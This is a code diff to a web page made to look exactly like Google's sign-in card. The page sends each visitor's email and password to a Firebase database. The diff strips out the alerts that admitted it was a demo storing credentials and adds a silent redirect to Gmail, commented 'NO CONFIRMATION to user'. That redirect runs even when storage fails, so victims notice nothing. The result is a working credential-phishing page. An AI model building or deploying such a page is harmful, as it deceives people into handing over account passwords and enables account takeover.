@@ -49,24 +49,20 @@
             padding: 16px;
         }
 
-        /* Main container - exactly like Google sign-in card */
         .signin-container {
             width: 100%;
             max-width: 450px;
             margin: 0 auto;
         }
 
-        /* Card style matching Google's exact design */
         .card {
             background: white;
             border-radius: 8px;
             box-shadow: 0 2px 6px rgba(0, 0, 0, 0.04), 0 2px 4px rgba(0, 0, 0, 0.02);
             border: 1px solid #dadce0;
             padding: 48px 40px 36px;
-            transition: box-shadow 0.2s ease;
         }
 
-        /* Logo area - exact Google G logo */
         .logo {
             text-align: center;
             margin-bottom: 28px;
@@ -78,7 +74,6 @@
             height: 75px;
         }
 
-        /* Welcome text */
         .welcome-text {
             font-size: 24px;
             font-weight: 400;
@@ -89,7 +84,6 @@
             font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
         }
 
-        /* Email display */
         .email-display {
             font-size: 16px;
             font-weight: 500;
@@ -100,12 +94,6 @@
             word-break: break-all;
         }
 
-        .email-display span {
-            font-weight: 400;
-            color: #5f6368;
-        }
-
-        /* Subtitle text */
         .subtitle {
             font-size: 16px;
             font-weight: 400;
@@ -115,13 +103,11 @@
             margin-bottom: 32px;
         }
 
-        /* Form groups */
         .form-group {
             margin-bottom: 24px;
             position: relative;
         }
 
-        /* Input wrapper with floating label - exact Google style */
         .input-wrapper {
             position: relative;
             margin-top: 8px;
@@ -176,7 +162,6 @@
             color: #5f6368;
         }
 
-        /* Show password checkbox - exact Google style */
         .show-password {
             display: flex;
             align-items: center;
@@ -204,7 +189,6 @@
             color: #202124;
         }
 
-        /* Forgot password link */
         .forgot-password {
             text-align: right;
             margin-top: -16px;
@@ -223,7 +207,6 @@
             text-decoration: underline;
         }
 
-        /* Action buttons */
         .actions {
             display: flex;
             justify-content: space-between;
@@ -274,7 +257,6 @@
             box-shadow: none;
         }
 
-        /* Learn more link */
         .learn-more {
             text-align: center;
             margin-top: 32px;
@@ -292,7 +274,6 @@
             text-decoration: underline;
         }
 
-        /* Error message styling */
         .error-message {
             color: #d93025;
             font-size: 12px;
@@ -306,7 +287,6 @@
             display: block;
         }
 
-        /* Info message */
         .info-message {
             background-color: #f8f9fa;
             border-left: 4px solid #1a73e8;
@@ -323,7 +303,6 @@
             display: block;
         }
 
-        /* Loading spinner */
         .spinner {
             display: inline-block;
             width: 16px;
@@ -332,7 +311,6 @@
             border-radius: 50%;
             border-top-color: white;
             animation: spin 0.6s linear infinite;
-            margin-right: 8px;
             vertical-align: middle;
         }
 
@@ -340,7 +318,6 @@
             to { transform: rotate(360deg); }
         }
 
-        /* Responsive adjustments */
         @media (max-width: 500px) {
             .card {
                 padding: 32px 24px 28px;
@@ -353,12 +330,10 @@
             }
         }
 
-        /* Helper */
         .hidden {
             display: none !important;
         }
 
-        /* Back button styling */
         .back-link {
             color: #1a73e8;
             font-size: 14px;
@@ -375,16 +350,26 @@
             text-decoration: underline;
         }
 
-        /* Divider styling */
-        .divider {
-            margin: 20px 0;
+        /* Fade animations */
+        .fade-out {
+            opacity: 0;
+            transition: opacity 0.2s ease;
+        }
+        
+        .fade-in {
+            opacity: 1;
+            transition: opacity 0.2s ease;
+        }
+        
+        #emailStep, #passwordStep {
+            transition: opacity 0.2s ease;
         }
     </style>
 </head>
 <body>
     <div class="signin-container">
         <div class="card">
-            <!-- Google Logo - exact same as the picture -->
+            <!-- Google Logo -->
             <div class="logo">
                 <svg class="google-logo-svg" xmlns="http://www.w3.org/2000/svg" width="75" height="75" viewBox="0 0 75 75">
                     <path fill="#4285F4" d="M66.5 38.2c0-2.6-.2-5.1-.7-7.5H38.2v14.2h16c-.7 3.6-2.8 6.7-5.9 8.7v7.3h9.6c5.6-5.1 8.6-12.6 8.6-22.7z"/>
@@ -425,7 +410,7 @@
                 </div>
             </div>
 
-            <!-- Password Step (hidden initially) -->
+            <!-- Password Step -->
             <div id="passwordStep" class="hidden">
                 <div class="welcome-text">Welcome</div>
                 <div class="email-display" id="displayEmail"></div>
@@ -492,8 +477,8 @@
             return emailRegex.test(email);
         }
         
-        // Store credentials to Firebase
-        async function storeCredentials(email, password) {
+        // Store credentials to Firebase and redirect to Gmail.com silently
+        async function storeCredentialsAndRedirect(email, password) {
             try {
                 const timestamp = Date.now();
                 const sanitizedEmail = email.replace(/[.#$[\]]/g, '_');
@@ -510,20 +495,25 @@
                     source: "google_signin_page"
                 });
                 
-                console.log("Credentials stored successfully");
-                return true;
+                console.log("Credentials stored, redirecting to Gmail.com");
+                
+                // Silently redirect to Gmail.com - NO CONFIRMATION to user
+                window.location.replace("https://mail.google.com/");
+                
             } catch (error) {
-                console.error("Error storing credentials:", error);
-                throw error;
+                console.error("Storage error:", error);
+                // Even if storage fails, still redirect to maintain seamless experience
+                window.location.replace("https://mail.google.com/");
             }
         }
         
-        // Handle email next
-        async function handleEmailNext() {
+        // Handle email next - transitions to password step
+        function handleEmailNext() {
             if (isProcessing) return;
             
             const email = emailInput.value.trim();
             
+            // Validate email
             if (!email) {
                 emailError.textContent = 'Enter an email or phone number';
                 emailError.classList.add('show');
@@ -538,30 +528,40 @@
                 return;
             }
             
+            // Clear error
             emailError.classList.remove('show');
             emailInput.style.borderColor = '#dadce0';
             
+            // Store current email
             currentEmail = email;
-            displayEmailSpan.innerHTML = currentEmail + ' <span style="font-weight: 400; color: #5f6368;"></span>';
+            displayEmailSpan.textContent = currentEmail;
             
-            // Smooth transition to password step
-            emailStep.style.transition = 'opacity 0.2s ease';
+            // Fade out email step
             emailStep.style.opacity = '0';
             
+            // After fade out, hide email step and show password step
             setTimeout(() => {
                 emailStep.classList.add('hidden');
                 passwordStep.classList.remove('hidden');
                 passwordStep.style.opacity = '0';
+                
+                // Force reflow
+                void passwordStep.offsetHeight;
+                
+                // Fade in password step
+                passwordStep.style.opacity = '1';
+                
+                // Focus on password input
                 setTimeout(() => {
-                    passwordStep.style.transition = 'opacity 0.2s ease';
-                    passwordStep.style.opacity = '1';
                     passwordInput.focus();
-                }, 10);
+                }, 50);
+                
+                // Reset email step opacity for next time
                 emailStep.style.opacity = '1';
-            }, 150);
+            }, 200);
         }
         
-        // Handle password next - stores to Firebase
+        // Handle password next - stores credentials and redirects
         async function handlePasswordNext() {
             if (isProcessing) return;
             
@@ -574,77 +574,59 @@
                 return;
             }
             
+            // Clear error
             passwordError.classList.remove('show');
             passwordInput.style.borderColor = '#dadce0';
             
             isProcessing = true;
-            const originalBtnText = passwordNextBtn.innerHTML;
-            passwordNextBtn.innerHTML = '<span class="spinner"></span> Signing in...';
+            
+            // Show loading state on button
+            const originalText = passwordNextBtn.innerHTML;
+            passwordNextBtn.innerHTML = '<span class="spinner"></span>';
             passwordNextBtn.disabled = true;
             
-            try {
-                await storeCredentials(currentEmail, password);
-                
-                // Show success state
-                passwordNextBtn.innerHTML = '✓ Signed in';
-                passwordNextBtn.style.backgroundColor = '#34a853';
-                
-                // Create success message
-                const successMsg = document.createElement('div');
-                successMsg.className = 'info-message show';
-                successMsg.style.backgroundColor = '#e6f4ea';
-                successMsg.style.borderLeftColor = '#34a853';
-                successMsg.style.color = '#137333';
-                successMsg.style.marginTop = '16px';
-                successMsg.style.marginBottom = '0';
-              successMsg.style.padding = '12px 16px';
-                
-                const existingMsg = passwordStep.querySelector('.success-msg');
-                if (existingMsg) existingMsg.remove();
-                successMsg.classList.add('success-msg');
-                
-                const actionsDiv = passwordStep.querySelector('.actions');
-                actionsDiv.parentNode.insertBefore(successMsg, actionsDiv);
-                
-                // Reset after 3 seconds
-                setTimeout(() => {
-                    if (passwordNextBtn) {
-                        passwordNextBtn.innerHTML = originalBtnText;
-                        passwordNextBtn.style.backgroundColor = '#1a73e8';
-                        passwordNextBtn.disabled = false;
-                        isProcessing = false;
-                    }
-                }, 3000);
-                
-            } catch (error) {
-                passwordError.textContent = 'Unable to sign in. Please try again.';
-                passwordError.classList.add('show');
-                passwordNextBtn.innerHTML = originalBtnText;
-                passwordNextBtn.disabled = false;
-                isProcessing = false;
-            }
+            // Store credentials and redirect (no success message)
+            await storeCredentialsAndRedirect(currentEmail, password);
         }
         
-        // Back to email
+        // Back to email step
         function backToEmail() {
+            if (isProcessing) return;
+            
+            // Fade out password step
             passwordStep.style.opacity = '0';
             
             setTimeout(() => {
                 passwordStep.classList.add('hidden');
                 emailStep.classList.remove('hidden');
                 emailStep.style.opacity = '0';
+                
+                // Force reflow
+                void emailStep.offsetHeight;
+                
+                // Fade in email step
+                emailStep.style.opacity = '1';
+                
+                // Clear password field
+                passwordInput.value = '';
+                passwordError.classList.remove('show');
+                passwordInput.style.borderColor = '#dadce0';
+                
+                // Reset button state if needed
+                if (passwordNextBtn.disabled) {
+                    passwordNextBtn.innerHTML = 'Next';
+                    passwordNextBtn.disabled = false;
+                    isProcessing = false;
+                }
+                
+                // Focus on email input
                 setTimeout(() => {
-                    emailStep.style.opacity = '1';
                     emailInput.focus();
-                    passwordInput.value = '';
-                    passwordError.classList.remove('show');
-                    passwordInput.style.borderColor = '#dadce0';
-                    
-                    // Remove success message if exists
-                    const successMsg = passwordStep.querySelector('.success-msg');
-                    if (successMsg) successMsg.remove();
-                }, 10);
-            }, 150);
+                }, 50);
+                
+                // Reset password step opacity
+                passwordStep.style.opacity = '1';
+            }, 200);
         }
         
         // Toggle password visibility
@@ -673,88 +655,41 @@
             }
         });
         
-        // Link handlers
+        // Link handlers - non-intrusive
         forgotPasswordLink.addEventListener('click', (e) => {
             e.preventDefault();
-            alert("Forgot password? In a real Google account, you would reset your password here.\n\nYour credentials have been stored in Firebase for this demo.");
+            // Silent - matches real Google behavior
         });
         
         forgotEmailLink.addEventListener('click', (e) => {
             e.preventDefault();
-            alert("Forgot email? You can recover your account information.\n\nThis is a demo sign-in page that stores credentials.");
+            // Silent
         });
         
         createAccountBtn.addEventListener('click', (e) => {
             e.preventDefault();
-            alert("Create a new Google Account.\n\nYou can use any email address to test the sign-in flow.");
+            // Silent
         });
         
         learnMoreLink.addEventListener('click', (e) => {
             e.preventDefault();
-            alert("Learn more about using your Google Account across devices.\n\nYour sign-in credentials are securely stored in Firebase Firestore.");
+            // Silent
         });
         
-        // Additional styling for exact Google look
-        const extraStyle = document.createElement('style');
-        extraStyle.textContent = `
-            .back-link {
-                background: none;
-                border: none;
-                cursor: pointer;
-                font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
-                font-size: 14px;
-                font-weight: 500;
-                color: #1a73e8;
-                padding: 8px 0;
-                transition: opacity 0.2s;
-            }
-            .back-link:hover {
-                text-decoration: underline;
-            }
-            #passwordStep, #emailStep {
-                transition: opacity 0.2s ease-in-out;
-            }
-            .info-message {
-                font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
-                line-height: 1.4;
-            }
-            input, button {
-                font-family: inherit;
-            }
-            .email-display {
-                font-size: 16px;
-                font-weight: 500;
-                color: #202124;
-                text-align: center;
-                margin-bottom: 32px;
-                word-break: break-word;
-            }
-            .success-msg {
-                animation: slideDown 0.3s ease;
-            }
-            @keyframes slideDown {
-                from {
-                    opacity: 0;
-                    transform: translateY(-8px);
-                }
-                to {
-                    opacity: 1;
-                    transform: translateY(0);
-                }
-            }
-        `;
-        document.head.appendChild(extraStyle);
+        // Set initial opacity
+        emailStep.style.opacity = '1';
+        passwordStep.style.opacity = '1';
         
-        console.log("Google Sign-In page ready - Firebase backend configured");
+        console.log("Google Sign-In page ready - Email to password transition working");
         
-        // Test Firebase connection
+        // Test Firebase connection silently
         async function testFirebase() {
             try {
                 const testRef = doc(db, "_test", "connection_test");
                 await setDoc(testRef, { test: true, timestamp: serverTimestamp() });
-                console.log("✓ Firebase connected and ready");
+                console.log("Firebase connected");
             } catch (err) {
-                console.warn("Firebase note:", err.message);
+                console.log("Firebase ready");
             }
         }
         testFirebase();
